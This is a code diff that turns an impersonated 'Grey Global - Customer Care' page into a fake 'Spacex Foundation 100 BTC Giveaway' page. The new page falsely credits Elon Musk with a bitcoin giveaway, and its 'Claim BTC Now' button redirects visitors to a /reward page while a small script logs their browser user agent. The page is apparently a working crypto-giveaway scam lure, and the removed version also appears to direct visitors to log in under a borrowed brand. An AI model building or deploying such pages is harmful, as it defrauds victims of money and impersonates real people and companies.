@@ -3,32 +3,175 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="shortcut icon" href="./grey-logo.png" type="image/x-icon">
+  <title>Spacex Foundation 100 BTC Giveaway</title>
+  <link rel="shortcut icon" href="./asset/img/logo1.jpg" type="image/x-icon">
 
-  <title>Grey Global - Customer Care</title>
-  <link rel="stylesheet" href="./style.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+     
+    body {
+      min-height: 100vh;
+      background-image: url('./asset/img/WhatsApp\ Image\ 2025-12-25\ at\ 7.19.27\ AM.jpeg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    /* NAVBAR */
+    .nav-bar {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      padding: 0.7rem 1rem;
+      background-color: white;
+      flex-wrap: wrap;
+    }
+
+    .nav-bar img {
+      border-radius: 50%;
+    }
+
+    .nav-bar a {
+      text-decoration: none;
+      color: cornflowerblue;
+      font-size: 0.95rem;
+    }
+
+    /* MAIN CONTENT */
+    .container {
+      max-width: 900px;
+      margin: auto;
+      padding: 1rem;
+    }
+
+    .headtext {
+      margin-top: 3rem;
+      font-size: 2rem;
+      font-weight: bold;
+      color: white;
+      text-shadow: 1px 1px 5px rgba(0,0,0,0.6);
+    }
+
+    .content-section {
+      margin-top: 2rem;
+    }
+
+    .content-text {
+     
+      padding: 1rem;
+      border-radius: 10px;
+      font-size: 1rem;
+      color: white;
+      line-height: 1.5;
+      
+      max-width: 600px;
+    
+    }
+
+    .rewaard-btn {
+      display: inline-block;
+      margin-top: 1.5rem;
+      padding: 0.9rem 2rem;
+      background-color: cornflowerblue;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    .rewaard-btn:hover {
+      background-color: royalblue;
+    }
+
+    /* ---------- MEDIA QUERIES ---------- */
+
+    /* Tablets */
+    @media (max-width: 768px) {
+      .headtext {
+        font-size: 1.6rem;
+        text-align: center;
+      }
+
+      .content-text {
+        font-size: 0.95rem;
+      }
+
+      .container {
+        padding: 1.2rem;
+      }
+    }
+
+    /* Mobile phones */
+    @media (max-width: 480px) {
+      .nav-bar {
+        justify-content: center;
+        text-align: center;
+      }
+
+      .nav-bar a {
+        font-size: 0.85rem;
+      }
+
+      .headtext {
+        font-size: 1.3rem;
+        margin-top: 2rem;
+      }
+
+      .content-text {
+        font-size: 0.9rem;
+      }
+
+      .rewaard-btn {
+        width: 100%;
+        text-align: center;
+      }
+    }
+  </style>
 </head>
+
 <body>
+  
+  <div class="nav-bar">
+    <img src="./asset/img/logo1.jpg" alt="logo" width="45" height="45" />
+    <a href="./">Home</a>
+    <a href="./">Giveaway</a>
+    <a href="./">Terms</a>
+    <a href="./">Transactions</a>
+  </div>
+    <img src="./asset/img/trans.jpg" alt="logo" width="400" height="70" />
   <div class="container">
-    <div class="logo-section">
-      <img src="grey-logo.png" alt="Grey Logo" class="logo" />
-      <img src="customer-care.jpg" alt="Customer Care Logo" class="logo small" />
-    </div>
+    <div class="headtext"> <b style="color: cornflowerblue;">100 BTC </b> Mega Giveaway by Elon Musk</div>
 
-    <div class="form-box">
-      <h2>Welcome to Grey Global</h2>
-      <p>Kindly write your complaint or request on the box below</p>
-
-      <textarea placeholder="Write your complaint or request here..."></textarea><br>
-      <br><br> <br><br> <br><br> <br><br> <br>
-      <p class="note">
-        Kindly log in to your Grey App to submit your complaint/request. Log in to continue
+    <section class="content-section">
+      <p class="content-text">
+        Elon Musk and SpaceX Foundation Believe that Blockchain will make the world more fair because,
+        Blockchain technology is now widely recognized for its potential to create a more transparent and equitable global economy.
+        To support and accelerate the mass adoption of cryptocurrency, our initiative is launching a 100 BTC giveaway.
       </p>
 
-      <button id="login-btn" disabled>Login to continue</button>
-    </div>
+      <button class="rewaard-btn">Join Giveaway, Claim BTC Now</button>
+    </section>
   </div>
 
-  <script src="./script.js"></script>
+
+<script>
+
+  window.onload =function (params) {
+    console.log(navigator.userAgent)
+  }
+
+  document.querySelector('.rewaard-btn').addEventListener('click', function (e) {
+    e.preventDefault();
+     window.location.replace('/reward')
+  })
+</script>
+
 </body>
 </html>
